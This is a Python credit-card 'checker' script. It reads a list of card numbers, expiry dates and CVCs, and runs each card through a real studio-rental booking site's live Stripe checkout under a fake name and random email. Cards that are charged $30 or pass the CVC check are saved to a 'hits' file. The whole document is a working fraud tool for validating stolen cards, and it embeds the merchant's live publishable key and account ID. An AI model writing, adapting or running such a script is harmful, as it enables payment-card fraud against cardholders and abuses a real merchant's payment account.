import uuid
import requests
from urllib.parse import urlencode

def random_string(length):
    import random
    import string
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def generate_guid():
    return str(uuid.uuid4())


file=input('enter cc list: ')
g=open(file,'r')	
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
		exy=ex[2]+ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			exy=ex[2]+'7'
		else:pass
	except:
		exy=ex[0]+ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			exy=ex[0]+'7'
		else:pass
	cvc=c.split('|')[3]
	em = random_string(10) + "@gmail.com"
	guid1 = generate_guid()
	guid2 = generate_guid()
	guid3 = generate_guid()
	
	
	url = "https://app.squarespacescheduling.com/schedule.php?owner=21346949&calendarID=4717062"
	headers = {
	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
	    "Pragma": "no-cache",
	    "Accept": "*/*"
	}
	response = requests.get(url, headers=headers)
	phpsessid = response.cookies.get("PHPSESSID")
	
	
	url = "https://api.stripe.com/v1/payment_methods"
	data = {
	    "type": "card",
	    "billing_details[name]": "Jame Mong",
	    "billing_details[email]": em,
	    "billing_details[address][postal_code]": "10080",
	    "card[number]": cc,
	    "card[exp_month]": exp,
	    "card[exp_year]": exy,
	    "guid": guid1,
	    "muid": guid2,
	    "sid": guid3,
	    "pasted_fields": "number",
	    "payment_user_agent": "stripe.js%2F04dac047e0%3B+stripe-js-v3%2F04dac047e0%3B+card-element",
	    "time_on_page": "193418",
	    "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
	    "_stripe_account": "acct_1Hr4hzAnMU46zgL6"
	}
	headers = {
	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
	    "Pragma": "no-cache",
	    "Accept": "*/*",
	    "Content-Type": "application/x-www-form-urlencoded"
	}
	response = requests.post(url, headers=headers, data=urlencode(data))
	if 'id' in response.text:
		
		pm = response.json()["id"]
		
		
		url = f"https://app.squarespacescheduling.com/schedule.php?action=getIntent&owner=21204314&PHPSESSID={phpsessid}"
		data = {
		    "amount": "30",
		    "clientDetails[name]": "Jame Mong",
		    "clientDetails[address_zip]": "10080",
		    "clientDetails[email]": em,
		    "description": "1112891149 - Jame Mong - Standard Studio A Rental - September 7, 2023 4:00pm",
		    "pm": pm
		}
		headers = {
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
		    "Pragma": "no-cache",
		    "Accept": "*/*",
		    "Content-Type": "application/x-www-form-urlencoded"
		}
		response = requests.post(url, headers=headers, data=urlencode(data))
		pi = response.text.split('"intent":"')[1].split('"')[0]
		cs = response.text.split('"clientSecret":"')[1].split('"')[0]
		
		
		url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
		data = {
		    "payment_method": pm,
		    "expected_payment_method_type": "card",
		    "use_stripe_sdk": "true",
		    "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
		    "_stripe_account": "acct_1Hr4hzAnMU46zgL6",
		    "client_secret": cs
		}
		headers = {
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
		    "Pragma": "no-cache",
		    "Accept": "*/*",
		    "Content-Type": "application/x-www-form-urlencoded"
		}
		response = requests.post(url, headers=headers, data=urlencode(data))
		response_json = response.json()
		
		
		if "message" in response.text:
		    print(f"{c} | Failure: {response_json['error']['message']}")
		elif "decline_code" in response.text:
		    print(f"{c} | Failure: {response_json['error']['decline_code']}")
		elif response_json.get("status") == "succeeded" or response_json.get("cvc_check") == "pass":
		    print(f"{c} | 30$✅ CCN")
		    open('hitsccn.txt','a').write(f'{c}\n')
		else:
		    print(f"{c} | Unknown Response")
	else:
		print(f'{c} | You Card Declined')